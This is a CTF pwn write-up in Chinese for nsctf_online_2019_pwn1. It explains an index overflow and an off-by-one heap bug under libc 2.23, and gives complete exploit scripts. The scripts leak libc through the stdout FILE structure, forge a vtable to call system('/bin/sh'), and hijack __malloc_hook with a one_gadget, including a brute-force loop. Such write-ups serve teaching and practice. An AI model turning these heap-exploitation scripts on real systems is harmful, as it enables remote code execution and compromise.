# nsctf_online_2019_pwn1



### 总结

根据本题，学习与收获有：

- 当`off by one`遇到`calloc`的时候，需要多次布局让`2`个指针，指向同一个`0x70`的`chunk`，然后一个先释放，然后利用`unsorted bin`的分割，使得`fd`变为`main_arena + 88`，再用另一个指针去修改`fd`劫持`stdout`结构体
- 分配`chunk`的时候，可以尽可能的小，对`chunk`的`size`要有敏感度
- 伪造`IO_FILE`结构的时候，注意`_lock`字段

<!-- more -->

### 题目分析

#### checksec

![image-20210822174301994](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210822174301994.png)

运行环境为`libc-2.23.so`

### 漏洞点

问题出在`update`函数，看了下其他人的解，好像都没注意到一个索引溢出的漏洞。

![image-20210822174419748](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210822174419748.png)

### 利用思路

#### 思路一

由于索引可以溢出，所以溢出上去看看，发现刚好可以溢出修改`stdout`结构体，因此，思路就很简单：

- 修改`_IO_2_1_stdout_`的`_IO_write_base`的低字节为`0x58`和`_flags`为`0xfbad1887`，泄露出`libc`的地址
- 再次劫持整个`_IO_2_1_stdout_`结构，直接伪造`vtable`，然后利用`puts`的调用链，执行`system("/bin/sh")`

泄露地址：

![image-20210822174850963](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210822174850963.png)



![image-20210822175026562](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210822175026562.png)



![image-20210822175116258](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210822175116258.png)

#### 思路二

就是利用`unlink`爆破四个`bit`位劫持`stdout`，然后再劫持`__malloc_hook`为`one_gdget`去拿`shell`

- 利用`off by null`使用`unlink`劫持`stdout`，泄露地址
- 劫持`__malloc_hook`

### Exp

#### 本地调试exp

两个方法都写在这儿了

```python
from pwncli import *

cli_script()


def add(p:tube, size:int, data:(str, bytes)="deadbeef\n"):
    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(size))
    p.sendafter("Input the content:\n", data)


def delete(p:tube, idx:int):
    p.sendlineafter("5.exit\n", "2")
    p.sendlineafter("Input the index:\n", str(idx))


def update(p:tube, idx:int, size:int, data:(str, bytes)):
    p.sendlineafter("5.exit\n", "4")
    p.sendlineafter("Input the index:\n", str(idx))
    p.sendlineafter("Input size:\n", str(size))
    p.sendafter("Input new content:\n", data)


def attack_by_stdout(p:tube, libc:ELF):
    # leak addr by stdout
    payload = flat(0xfbad1887, 0, 0, 0, "\x58")
    update(p, -16, 0xdead, payload)

    leak_addr = u64(p.recvn(8))
    log_address("leak_addr", leak_addr)
    libc_base_addr = leak_addr - 0x3c56a3
    log_address("libc_base_addr", libc_base_addr)
    libc.address = libc_base_addr

    # hijack IO_XSPUTN to system
    file_str = FileStructure()
    file_str.flags = u64("/bin/sh\x00")
    file_str.vtable = libc.sym["_IO_2_1_stdout_"] + 0x10
    file_str._IO_save_base = libc.sym['system']
    file_str._lock = libc_base_addr + 0x3c6780
    update(p, -16, 0xdead, bytes(file_str))

    p.interactive()


def attack_off_by_one(p:tube, libc:ELF):
    add(p, 0x80) # 0
    add(p, 0x68) # 1
    add(p, 0xf0) # 2
    add(p, 0x20) # 3 gap
    
    # free 0
    delete(p, 0)
    update(p, 1, 0x68, flat({0x60:0x100}, length=0x68))
    delete(p, 2)
    
    add(p, 0x80) # 0
    add(p, 0x68) # 2
    add(p, 0xf0) # 4 

    # again
    delete(p, 0)
    update(p, 2, 0x68, flat({0x60:0x100}, length=0x68))
    delete(p, 4)

    #
    add(p, 0xf0, flat({0x80:[0, 0x71]})) # 0
    add(p, 0xf0) # 4

    delete(p, 0)

    delete(p, 1)
    add(p, 0x80)

    secb = input("Give me the second byte: ")
    payload = p16(((int16(secb)) << 8) + 0xdd)
    update(p, 2, 0x2, payload)

    add(p, 0x60) # 1

    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(0x59)) # 1

    p.sendafter("Input the content:", flat(["\x00" * 0x33, 0xfbad1887, 0, 0, 0, "\x58"], filler="\x00"))

    leak_addr = u64(p.recvn(8))
    libc_base_addr = leak_addr - 0x3c56a3
    log_address("libc_base_addr", libc_base_addr)

    delete(p, 1)
    payload = p64(libc.sym['__malloc_hook'] - 0x23 + libc_base_addr)
    update(p, 2, 0x8, payload)

    add(p, 0x60)
    # payload = flat(["\x00" * 11, libc_base_addr + 0xf1147, libc.sym['realloc'] + libc_base_addr], filler="\x00")
    payload = flat(["\x00" * 0x13, libc_base_addr + 0xf1147], filler="\x00")
    add(p, 0x60, payload)

    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(0x123)) # 1

    p.interactive()   


attack_by_stdout(gift['io'], gift['libc'])

```

#### 爆破版exp

利用一个装饰器即可进行爆破，只要函数遵循相关调用约定

```python
from pwncli import *

def add(p:tube, size:int, data:(str, bytes)="deadbeef\n"):
    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(size))
    p.sendafter("Input the content:\n", data)


def delete(p:tube, idx:int):
    p.sendlineafter("5.exit\n", "2")
    p.sendlineafter("Input the index:\n", str(idx))


def update(p:tube, idx:int, size:int, data:(str, bytes)):
    p.sendlineafter("5.exit\n", "4")
    p.sendlineafter("Input the index:\n", str(idx))
    p.sendlineafter("Input size:\n", str(size))
    p.sendafter("Input new content:\n", data)


# @remote_enumerate_attack(ip='node4.buuoj.cn', port=29958, libc_path="/root/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so", loop_time=0x30)
@local_enumerate_attack(argv="./nsctf_online_2019_pwn1",libc_path="/root/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so", loop_time=0x40)
def attack_off_by_one_loop(p:tube, libc:ELF):
    add(p, 0x80) # 0
    add(p, 0x68) # 1
    add(p, 0xf0) # 2
    add(p, 0x20) # 3 gap
    
    # free 0
    delete(p, 0)
    update(p, 1, 0x68, flat({0x60:0x100}, length=0x68))
    delete(p, 2)
    
    add(p, 0x80) # 0
    add(p, 0x68) # 2
    add(p, 0xf0) # 4 

    # again
    delete(p, 0)
    update(p, 2, 0x68, flat({0x60:0x100}, length=0x68))
    delete(p, 4)

    #
    add(p, 0xf0, flat({0x80:[0, 0x71]})) # 0
    add(p, 0xf0) # 4

    delete(p, 0)

    delete(p, 1)
    add(p, 0x80)

    info("try to hijack stdout...")
    secb = "0x55"
    payload = p16(((int16(secb)) << 8) + 0xdd)
    update(p, 2, 0x2, payload)

    add(p, 0x60) # 1

    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(0x59)) # 1

    p.sendafter("Input the content:", flat(["\x00" * 0x33, 0xfbad1887, 0, 0, 0, "\x58"], filler="\x00"))

    leak_addr = u64(p.recvn(8))
    libc_base_addr = leak_addr - 0x3c56a3
    log_address("libc_base_addr", libc_base_addr)

    delete(p, 1)
    payload = p64(libc.sym['__malloc_hook'] - 0x23 + libc_base_addr)
    update(p, 2, 0x8, payload)

    add(p, 0x60)
    # payload = flat(["\x00" * 11, libc_base_addr + 0xf1147, libc.sym['realloc'] + libc_base_addr], filler="\x00")
    payload = flat(["\x00" * 0x13, libc_base_addr + 0xf1147], filler="\x00")
    add(p, 0x60, payload)

    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(0x123)) # 1

    p.sendline("cat /flag")
    msg = p.recv()
    if b"flag" in msg:
        print("Get flag:", msg)
        raise PwncliExit()
    else:
        raise RuntimeError()
    
    p.interactive()   


context.arch="amd64"
attack_off_by_one_loop(None, None)
```

远程爆破效果：

![image-20210822175632153](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210822175632153.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-08-22-nsctf-online-2019-pwn1/  

